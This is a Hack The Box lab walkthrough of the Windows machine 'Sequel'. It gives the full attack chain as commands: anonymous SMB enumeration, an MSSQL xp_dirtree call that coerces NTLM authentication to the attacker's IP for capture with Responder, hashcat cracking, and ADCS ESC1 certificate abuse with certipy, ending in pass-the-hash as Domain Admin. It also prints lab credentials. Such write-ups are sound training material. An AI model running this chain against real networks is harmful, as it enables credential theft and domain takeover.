---
title: "Hack The Box: Sequel Walkthrough"
date: 2026-02-02 18:00:00 +0000
categories: [HACK THE BOX]
tags: [walkthrough, windows, mssql, adcs, esc1, active-directory, medium]
image:
  path: /assets/sequel/cover.png
---

## 💾 Machine Overview

- **Name:** Sequel  
- **Difficulty:** Medium  
- **OS:** Windows  
- **Category:** Active Directory / MSSQL / ADCS  
- **Attack Chain:** Anonymous SMB → MSSQL Coercion → Log Analysis → ADCS ESC1

**Sequel** is a medium-difficulty machine that highlights the dangers of credential leakage in public shares and the devastating impact of misconfigured Active Directory Certificate Services (ADCS). By chaining MSSQL exploitation with insecure log storage, we escalate from an anonymous guest to a Domain Administrator.

---

## 0x01: Initial Enumeration

### SMB Reconnaissance
I started with anonymous SMB enumeration to see if any shares were left open to the public.

```python
smbclient -L //10.129.228.253 -N
```
![Desktop View](/assets/sequal/image1.png){: width="700" height="400" .normal }

![Desktop View](/assets/sequal/image2.png){: width="700" height="400" .normal }

The output revealed a Public share. Upon connecting, I found a PDF document containing hardcoded credentials:
![Desktop View](/assets/sequal/image3.png){: width="700" height="400" .normal }


```python
User: PublicUser
Password: GuestUserCantWrite1
```

## 0x02: MSSQL Authentication & Coercion
Gaining a SQL Foothold
Given the machine name, I tested these credentials against the MSSQL service using netexec.

```python
netexec mssql 10.129.228.253 -u PublicUser -p 'GuestUserCantWrite1' --local-auth
```

Authentication was successful. I then dropped into an interactive SQL shell via impacket-mssqlclient.

Capturing the Service Account Hash
I attempted to coerce the SQL service account into authenticating to my machine over SMB using the xp_dirtree stored procedure.

Start Responder:

```python
sudo responder -I tun0 -dwv
```

Execute Coercion:

```python
EXEC master..xp_dirtree '\\10.10.16.243\share';
```

Responder successfully captured the NTLMv2 hash for the sql_svc account.

![Desktop View](/assets/sequal/image4.png){: width="700" height="400" .normal }

### Password Cracking
I used hashcat to crack the captured hash:

```python
hashcat -m 5600 svchash.txt /usr/share/wordlists/rockyou.txt
```

![Desktop View](/assets/sequal/image5.png){: width="700" height="400" .normal }

```python
Recovered: sql_svc : REGGIE1234ronnie
```

## 0x03: Filesystem Analysis
Lateral Movement
Using the sql_svc credentials, I gained a shell via Evil-WinRM. I began hunting for sensitive information within the SQL Server directories.

```python
cd C:\SQLServer\logs
```
![Desktop View](/assets/sequal/image7.png){: width="700" height="400" .normal }

![Desktop View](/assets/sequal/image8.png){: width="700" height="400" .normal }

Inside the log files, I discovered plaintext credentials for another domain user:

```python
User: Ryan.Cooper
Password: NuclearMosquito3
```

## 0x04: ADCS Exploitation (ESC1)
Identifying Vulnerable Templates
With Ryan Cooper’s credentials, I used certipy-ad to check for ADCS misconfigurations.

```python
certipy-ad find \
  -u 'ryan.cooper' \
  -p 'NuclearMosquito3' \
  -target 10.129.228.253 \
  -vulnerable -enabled -stdout
```

The scan identified an ESC1 vulnerability. This occurs when a template allows the enrollee to supply a Subject Alternative Name (SAN), allowing any user to request a certificate as a Domain Admin.

Impersonating Administrator
I requested a certificate for the Administrator account using the vulnerable UserAuthentication template:

```python
certipy-ad req \
  -u ryan.cooper \
  -p 'NuclearMosquito3' \
  -ca sequel-DC-CA \
  -template UserAuthentication \
  -upn Administrator@sequel.htb \
  -dc-ip 10.129.228.253
```

## 0x05: Domain Admin Access
Finally, I used the forged .pfx certificate to authenticate and retrieve the Administrator's NT hash.

python
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
With the hash in hand, I logged in to the Domain Controller:

python
evil-winrm -u Administrator -H <HASH> -i 10.129.228.253
Pwned! Full Domain Administrator access achieved.

📝 Conclusion
Sequel highlights a classic "cascade" of failures:

Information Leakage: Hardcoded creds in a PDF.

Service Abuse: Coercing MSSQL for NTLM relay/cracking.

Insecure Logs: Storing passwords in plaintext files.

Misconfigured ADCS: The final nail in the coffin via ESC1.

Happy Hacking XD!